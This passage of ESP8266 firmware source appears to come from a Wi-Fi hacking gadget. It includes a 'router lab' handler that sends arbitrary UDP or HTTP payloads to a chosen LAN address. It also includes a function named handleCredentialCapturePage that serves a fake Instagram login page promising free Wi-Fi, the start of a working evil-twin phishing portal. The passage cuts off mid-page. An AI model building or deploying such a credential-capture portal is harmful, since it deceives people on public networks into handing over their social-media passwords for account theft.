ecsistem/oled-esp8266/src/wifi_portal.cpp
    WiFi.scanDelete();
    return options;
  }

  constexpr size_t kLabPayloadMax = 512;

  bool decodeHexPayload(const String &hex, uint8_t *out, size_t outCap, size_t &written)
  {
    written = 0;
    String compact;
    compact.reserve(hex.length());

    for (unsigned i = 0; i < hex.length(); i++)
    {
      char c = hex[i];
      if (c == ' ' || c == '\t' || c == '\n' || c == '\r')
      {
        continue;
      }
      if (!isxdigit(static_cast<unsigned char>(c)))
      {
        return false;
      }
      compact += c;
    }

    if ((compact.length() % 2U) != 0 || compact.length() == 0)
    {
      return false;
    }

    written = compact.length() / 2;
    if (written > outCap)
    {
      return false;
    }

    auto nibble = [](char c) -> int
    {
      if (c >= '0' && c <= '9')
        return c - '0';
      if (c >= 'a' && c <= 'f')
        return 10 + c - 'a';
      if (c >= 'A' && c <= 'F')
        return 10 + c - 'A';
      return -1;
    };

    for (size_t i = 0; i < written; i++)
    {
      int hi = nibble(compact[i * 2]);
      int lo = nibble(compact[i * 2 + 1]);
      if (hi < 0 || lo < 0)
      {
        return false;
      }
      out[i] = static_cast<uint8_t>((hi << 4) | lo);
    }

    return true;
  }

  bool isSafeHttpPath(const String &p)
  {
    if (p.length() == 0 || p[0] != '/')
    {
      return false;
    }
    if (p.indexOf("..") >= 0)
    {
      return false;
    }
    for (unsigned i = 0; i < p.length(); i++)
    {
      char c = p[i];
      if (c == '<' || c == '>' || c == '"' || c == '\\')
      {
        return false;
      }
    }
    return true;
  }

  void handleApiScanJson()
  {
    int n = WiFi.scanNetworks(false, true);

    JsonDocument doc;
    JsonArray arr = doc["networks"].to<JsonArray>();

    constexpr int kScanJsonMax = 48;
    if (n > 0)
    {
      int limit = n > kScanJsonMax ? kScanJsonMax : n;
      for (int i = 0; i < limit; i++)
      {
        JsonObject o = arr.add<JsonObject>();
        o["ssid"] = WiFi.SSID(i);
        o["rssi"] = WiFi.RSSI(i);
        o["channel"] = WiFi.channel(i);
        o["bssid"] = WiFi.BSSIDstr(i);
      }
    }

    WiFi.scanDelete();

    String payload;
    serializeJson(doc, payload);
    server.send(200, "application/json; charset=utf-8", payload);
  }

  void sendRouterLabResultPage(bool ok, const String &detail)
  {
    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;padding:20px}a{color:#7cc7ff}</style></head><body>";
    page += ok ? "<p style='color:#58d68d'>Envio concluido.</p>" : "<p style='color:#ff7675'>Falha no envio.</p>";
    page += "<p class='muted'>" + escapeHtml(detail) + "</p>";
    page += "<p><a href='/admin'>Voltar ao /admin</a></p></body></html>";
    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleRouterLabSend()
  {
    if (WiFi.status() != WL_CONNECTED)
    {
      sendRouterLabResultPage(false, "STA desconectado. Conecte o ESP na mesma LAN do roteador para enviar UDP/HTTP.");
      return;
    }

    String ipStr = server.arg("router_ip");
    IPAddress addr;

    if (!addr.fromString(ipStr))
    {
      sendRouterLabResultPage(false, "IP invalido.");
      return;
    }

    int port = parseIntBounded(server.arg("router_port"), 1, 65535, 0);
    if (port == 0)
    {
      sendRouterLabResultPage(false, "Porta invalida (1-65535).");
      return;
    }

    String mode = server.arg("lab_mode");
    if (mode != "udp" && mode != "http")
    {
      sendRouterLabResultPage(false, "Modo invalido (use udp ou http).");
      return;
    }

    uint8_t buf[kLabPayloadMax];
    size_t len = 0;

    if (server.hasArg("payload_hex"))
    {
      String hex = server.arg("payload");
      hex.trim();
      if (hex.length() == 0)
      {
        len = 0;
      }
      else if (!decodeHexPayload(hex, buf, sizeof(buf), len))
      {
        sendRouterLabResultPage(false, "Payload hex invalido (pares de 0-9 A-F, opcional espacos).");
        return;
      }
    }
    else
    {
      String raw = server.arg("payload");
      if (raw.length() > static_cast<int>(kLabPayloadMax))
      {
        sendRouterLabResultPage(false, "Payload texto muito grande (max 512 bytes).");
        return;
      }
      memcpy(buf, raw.c_str(), raw.length());
      len = raw.length();
    }

    if (mode == "udp")
    {
      WiFiUDP udp;
      if (!udp.begin(0))
      {
        sendRouterLabResultPage(false, "UDP: begin(local) falhou.");
        return;
      }
      if (!udp.beginPacket(addr, static_cast<uint16_t>(port)))
      {
        sendRouterLabResultPage(false, "UDP: beginPacket falhou.");
        return;
      }
      udp.write(buf, len);
      if (!udp.endPacket())
      {
        sendRouterLabResultPage(false, "UDP: endPacket falhou.");
        return;
      }

      sendRouterLabResultPage(true, "UDP " + String(len) + " bytes para " + ipStr + ":" + String(port));
      return;
    }

    String path = server.arg("http_path");
    if (path.length() == 0)
    {
      path = "/";
    }
    if (!isSafeHttpPath(path))
    {
      sendRouterLabResultPage(false, "Caminho HTTP invalido (deve comecar com /, sem ..).");
      return;
    }

    WiFiClient client;
    HTTPClient http;
    String url = String("http://") + addr.toString() + ":" + String(port) + path;
    http.setTimeout(8000);
    http.setReuse(false);

    if (!http.begin(client, url))
    {
      sendRouterLabResultPage(false, "HTTP: begin falhou.");
      return;
    }

    http.addHeader("Content-Type", "application/octet-stream");
    int code = http.POST(buf, len);
    http.end();

    if (code > 0)
    {
      sendRouterLabResultPage(true, "HTTP POST codigo " + String(code) + ", " + String(len) + " bytes -> " + url);
    }
    else
    {
      sendRouterLabResultPage(false, "HTTP POST falhou (codigo " + String(code) + ").");
    }
  }

  void handleCredentialCapturePage()
  {
    if (!captivePortalEnabled)
    {
      server.sendHeader("Location", "/admin", true);
      server.send(302, "text/plain", "");
      return;
    }

    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
      <title>Instagram • Login for Free WiFi</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          margin: 0;
          padding: 0;
          background: #fafafa;
        }
        .main {
          display: flex;
          flex-direction: column;
          align-items: center;
          margin-top: 12px;
        }
        .container {
          width: 350px;
          background: white;
          border: 1px solid #dbdbdb;
          border-radius: 1px;
          padding: 10px 0;
          margin-bottom: 10px;
        }
        .logo {
          margin: 22px auto 12px;
          text-align: center;
        }
        .instagram-logo {
          font-family: 'Segoe UI', Arial, sans-serif;
          font-size: 40px;
          font-weight: bold;
          color: #262626;
          background: -webkit-linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
          -webkit-background-clip: text;
          background-clip: text;
          -webkit-text-fill-color: transparent;
          display: inline-block;
          margin: 10px auto;
          letter-spacing: -1px;
        }
        .wifi-message {
          text-align: center;
          background: #fff;
          padding: 15px;
          margin: 10px auto;
          width: 350px;
          border: 1px solid #dbdbdb;
          border-radius: 1px;
          color: #262626;
          font-size: 14px;
          line-height: 1.5;
        }
        .wifi-message h3 {
          color: #0095f6;
          margin: 0 0 10px 0;
          font-size: 16px;
        }
        form {
          padding: 0 40px;
        }
        input {
          width: 100%;
          background: #fafafa;
          padding: 9px 8px;
          margin: 6px 0;
          border: 1px solid #dbdbdb;
          border-radius: 3px;
          box-sizing: border-box;
          font-size: 14px;
          color: #262626;
        }
        input:focus {
          border-color: #a8a8a8;
          outline: none;
        }
        button {
          width: 100%;
          background: #0095f6;
          color: white;
          padding: 7px 16px;
          border: none;
          border-radius: 4px;
          font-weight: 600;
          font-size: 14px;
          cursor: pointer;
          margin: 8px 0;
        }
        button:hover {
          background: #0086e0;
        }
        .divider {
          display: flex;
          align-items: center;
          margin: 10px 0 18px;
        }
        .line {
          flex-grow: 1;
          height: 1px;
          background: #dbdbdb;
        }
        .or {
          color: #8e8e8e;
          font-size: 13px;
          font-weight: 600;
          margin: 0 18px;
        }
        .footer {
          width: 350px;
          text-align: center;
          padding: 20px;
        }
        .footer a {
          color: #00376b;
          text-decoration: none;
          font-size: 12px;
        }
        .footer span {
          color: #8e8e8e;
          font-size: 12px;
          margin: 0 8px;
        }
      </style>
    </head>
    <body>
      <div class="main">
        <div class="wifi-message">
          <h3>Free WiFi Access</h3>
          <p>Login with Instagram to get 4 hours of free high-speed internet access. Connect with friends while enjoying our complimentary WiFi service.</p>
        </div>

